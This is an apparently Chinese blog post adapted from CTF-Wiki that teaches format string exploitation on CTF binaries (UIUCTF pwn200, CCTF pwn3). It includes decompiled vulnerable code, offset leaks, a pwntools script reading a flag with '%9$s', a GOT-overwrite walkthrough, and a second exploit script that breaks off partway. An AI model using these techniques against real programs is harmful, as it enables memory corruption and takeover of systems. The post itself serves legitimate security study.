<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>格式化字符串漏洞基础例子 | SkYe231 Blog</title><meta name="keywords" content="PWN,格式化字符"><meta name="author" content="SkYe231"><meta name="copyright" content="SkYe231"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="格式化字符串漏洞基础例子 绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录  64 位程序格式化字符串漏洞原理其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。 例子确定保护这里，我们以 2017">
<meta property="og:type" content="article">
<meta property="og:title" content="格式化字符串漏洞基础例子">
<meta property="og:url" content="https://www.mrskye.cn/archives/91d59204/index.html">
<meta property="og:site_name" content="SkYe231 Blog">
<meta property="og:description" content="格式化字符串漏洞基础例子 绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录  64 位程序格式化字符串漏洞原理其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。 例子确定保护这里，我们以 2017">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.mrskye.cn/img/default_cover2.png">
<meta property="article:published_time" content="2020-06-06T08:20:00.000Z">
<meta property="article:modified_time" content="2021-04-06T11:23:30.256Z">
<meta property="article:author" content="SkYe231">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="格式化字符">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.mrskye.cn/img/default_cover2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.mrskye.cn/archives/91d59204/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8184ae9371af7cedfa47d27c247e16b8";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-154693872-1"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-154693872-1');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离上次更新已经","messageNext":"天，内容可能已经过时了。"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: SkYe231","link":"链接: ","source":"来源: SkYe231 Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '格式化字符串漏洞基础例子',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-06 19:23:30'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/font_2567732_2yo06945456.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="SkYe231 Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">135</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">173</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-wrench"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://mrskye.gitee.io/cyberchef/"><i class="fa-fw fas fa-key"></i><span> cyberchef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.link"><i class="fa-fw fas fa-subway"></i><span> 开往</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">SkYe231 Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-wrench"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://mrskye.gitee.io/cyberchef/"><i class="fa-fw fas fa-key"></i><span> cyberchef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.link"><i class="fa-fw fas fa-subway"></i><span> 开往</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">格式化字符串漏洞基础例子</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-06-06T08:20:00.000Z" title="发表于 2020-06-06 16:20:00">2020-06-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-06T11:23:30.256Z" title="更新于 2021-04-06 19:23:30">2021-04-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>37分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="格式化字符串漏洞基础例子"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="格式化字符串漏洞基础例子"><a href="#格式化字符串漏洞基础例子" class="headerlink" title="格式化字符串漏洞基础例子"></a>格式化字符串漏洞基础例子</h1><blockquote>
<p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p>
</blockquote>
<h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？<strong>虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</strong></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="确定保护"><a href="#确定保护" class="headerlink" title="确定保护"></a>确定保护</h4><p>这里，我们以 2017 年的 UIUCTF 中 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以看出程序开启了 Canary、NX 保护以及部分 RELRO 保护。</p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>可以发现，程序的漏洞很明显</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">21</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">    v5 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v5 || v11[j] != v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(format);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">        fflush(_bss_start);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 <code>%9$s</code> 即可得到 flag 的内容。当然，我们还有更简单的方法利用 <a target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> 中的 fmtarg 来判断某个参数的偏移。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  fmtarg 0x00007fffffffdb28</span><br><span class="line">The index of format argument : 10</span><br></pre></td></tr></table></figure>

<p>需要注意的是我们必须 break 在 printf 处。</p>
<blockquote>
<p>来自 resery 师傅注解：</p>
<p>这里的 10 是由 5+5 得到的，至于为什么是这两个 5 是从哪里的得到的，我来解释一下，前面的 5：由于 64 为程序，前 64 个参数是存在寄存器中的，分别是 rdi，rsi，rcx，rdx，r8，r9，所以第一个格式化字符串是存储在 rdi 中的，所以 flag 对应的偏移就应该是 5+flag 在栈中的偏移，在栈中的偏移就很好理解了就是 5，所以 flag 对应的格式化字符串偏移为 10</p>
</blockquote>
<p><strong>注解</strong></p>
<ol>
<li><p>我安装的 Pwndbg 并没有 fmtarg  ，可能是版本不对，如果需要安装一下 gef 插件。</p>
</li>
<li><p>两个作者都解释了偏移 10 是怎么计算来，但我更喜欢的方法是<strong>输入一长串 %p 得出输入字符串的偏移是多少，然后再计算目标偏移或地址</strong>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./goodluck</span> </span><br><span class="line">what&#x27;s the flag</span><br><span class="line"><span class="meta">bbbbbbbb%</span><span class="bash">p%p%p%p%p%p%p%p%p%p%p</span></span><br><span class="line">You answered:</span><br><span class="line">bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161</span><br><span class="line">But that was totally wrong lol get rekt</span><br></pre></td></tr></table></figure>

<p>0x602830 是第 7 位。为什么泄露的不是 0x6262626262626262 ？前面提到了，64 位系统的前六个参数是寄存器传参的，而 bbbbbbbb 是第一个参数自然在寄存器中存放，0x602830 就是存储的寄存器地址。怎么获得这个地址？gdb 调试断点打在 printf 函数：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_0.png" alt="fmrstr_0"></p>
<p>这样得出最后的 flag 偏移为 10 。</p>
</li>
</ol>
<h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 这个库没有用到可以注释掉</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn.sniperoj.cn&#x27;</span>, <span class="number">30017</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的（延迟绑定技术）。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
<p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤</p>
<ul>
<li><p>确定函数 A 的 GOT 表地址。</p>
<ul>
<li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。（因为这类函数会在程序源码中使用到，所以能直接或间接从 elf 文件中读取）</li>
</ul>
</li>
<li><p>确定函数 B 的内存地址</p>
<ul>
<li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li>
</ul>
</li>
<li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p>
<ul>
<li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
<ul>
<li>写入函数：write 函数（常见）</li>
<li>格式化字符串任意地址写（常见）</li>
<li>ROP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset &#x3D; system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] &#x3D; [printf@got] + addr_offset</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 2016 CCTF 中的 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a> 为例进行介绍。</p>
<h4 id="确定保护-1"><a href="#确定保护-1" class="headerlink" title="确定保护"></a>确定保护</h4><p>如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看出程序主要开启了 NX 保护。RELRO 是部分保护，这种状态下可以修改 GOT 表，如果是 FULL 则不行。另外我们一般默认远程都是开启 ASLR 保护的。</p>
<h4 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h4><p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+1Ch] [bp-FCh]@5</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [sp+E4h] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+10Ch] [bp-Ch]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enter the file name you want to get:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%40s&quot;</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;flag&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too young, too simple&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="keyword">char</span> *)file_head; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">60</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(i, &amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;dest, i + <span class="number">0x28</span>);<span class="comment">//将内容复制到dest</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;dest);<span class="comment">//输出dest内容</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p>
<ul>
<li>绕过密码</li>
<li>确定格式化字符串参数偏移</li>
<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li>
<li>修改 puts@got 的内容为 system 的地址。</li>
<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
</ul>
<h4 id="漏洞利用程序"><a href="#漏洞利用程序" class="headerlink" title="漏洞利用程序"></a>漏洞利用程序</h4><p>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : filename.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;ftp&gt;&quot;</span>)</span><br><span class="line">   